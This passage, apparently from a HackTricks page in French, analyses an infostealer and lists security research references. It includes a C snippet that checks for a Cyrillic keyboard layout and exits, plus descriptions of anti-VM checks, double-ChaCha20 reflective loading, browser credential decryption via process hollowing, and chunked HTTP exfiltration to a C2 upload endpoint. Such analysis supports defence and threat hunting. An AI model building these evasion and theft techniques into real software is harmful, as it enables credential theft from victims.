- Un flag de configuration (`anti_cis`) énumère les dispositions de clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est trouvée, l'échantillon laisse tomber un marqueur vide `CIS` et se termine avant d'exécuter les stealers, garantissant qu'il ne se déclenche jamais sur les locales exclues tout en laissant un artefact de chasse.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logique en couches `check_antivm`

- La variante A parcourt la liste des processus, hache chaque nom avec un checksum roulant personnalisé, et compare le résultat à des blocklists embarquées pour debuggers/sandboxes ; elle refait le checksum sur le nom de l'ordinateur et vérifie des répertoires de travail comme `C:\analysis`.
- La variante B inspecte les propriétés système (seuil du nombre de processus, uptime récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox, et effectue des contrôles de temporisation autour des sleeps pour repérer le single-stepping. Toute détection provoque un abandon avant le lancement des modules.

### Fileless helper + double ChaCha20 reflective loading

- Le DLL/EXE principal embarque un Chromium credential helper qui est soit déposé sur le disque, soit mappé manuellement en mémoire ; en fileless mode il résout lui‑même les imports/relocations pour qu'aucun artefact du helper ne soit écrit.
- Ce helper stocke une DLL de deuxième étape chiffrée deux fois avec ChaCha20 (deux clés de 32 octets + nonces de 12 octets). Après les deux passes, il reflectively loads le blob (no `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Les routines ChromElevator utilisent direct-syscall reflective process hollowing pour injecter dans un Chromium en cours d'exécution, hériter des clés AppBound Encryption, et déchiffrer mots de passe/cookies/cartes de crédit directement depuis les bases SQLite malgré le durcissement ABE.

### Collecte modulaire en mémoire et exfiltration HTTP par morceaux

- `create_memory_based_log` parcourt une table globale de pointeurs de fonctions `memory_generators` et lance un thread par module activé (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Chaque thread écrit les résultats dans des buffers partagés et signale son nombre de fichiers après une fenêtre de join d'environ 45 s.
- Une fois fini, tout est compressé avec la librairie statiquement liée `miniz` en `%TEMP%\\Log.zip`. `ThreadPayload1` dort ensuite 15 s puis envoie l'archive par morceaux de 10 MB via HTTP POST vers `http://<C2>:6767/upload`, en usurpant une boundary `multipart/form-data` de navigateur (`----WebKitFormBoundary***`). Chaque chunk ajoute `User-Agent: upload`, `auth: <build_id>`, optionnel `w: <campaign_tag>`, et le dernier chunk ajoute `complete: true` pour que le C2 sache que le réassemblage est terminé.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
